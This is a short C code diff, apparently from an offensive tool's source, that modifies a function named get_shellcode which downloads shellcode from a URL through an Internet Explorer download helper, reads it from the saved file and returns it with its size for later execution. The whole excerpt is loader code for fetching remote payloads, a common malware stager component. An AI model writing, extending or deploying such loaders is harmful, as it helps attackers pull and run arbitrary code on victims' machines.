@@ -152,12 +152,16 @@ char* ie_download(char* string)
 }
 
 
-unsigned char* get_shellcode(char *arg1) {
+// Retrieval of shellcode via IE download to file. The shellcode is then read from the file and returned.
+//
+// arg1 specifies the URL to download the file from.
+// shellcode_size receives the size of the shellcode in bytes.
+unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
 	#ifdef PRINT_DEBUG
 		printf("exec shellcode from url\n");
 	#endif
 	
 	char *sh_filename = ie_download(arg1);
-	int size = get_filesize(sh_filename);	
-	return load_textfile(sh_filename, size);
+	*shellcode_size = get_filesize(sh_filename);	
+	return load_textfile(sh_filename, *shellcode_size);
 }
